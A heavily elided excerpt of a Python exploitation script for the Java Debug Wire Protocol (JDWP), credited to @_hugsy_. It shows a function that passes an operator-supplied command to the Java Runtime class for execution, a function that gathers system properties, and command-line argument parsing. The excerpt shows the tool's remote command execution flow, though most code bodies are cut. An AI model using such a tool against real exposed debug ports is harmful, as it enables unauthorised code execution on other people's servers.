...
def runtime_exec(jdwp, args):
    ...
    if args.cmd:
        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"],
                             getRuntimeMeth["methodId"], args.cmd)
    else:
...
def runtime_exec_info(jdwp, threadId):
    properties = {
        ...
        "java.library.path": "Library paths",
...
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Universal exploitation script for JDWP by @_hugsy_ (Python3 port)",
    ...
    parser.add_argument("--break-on", dest="break_on", type=str,
                        metavar="JAVA_METHOD",
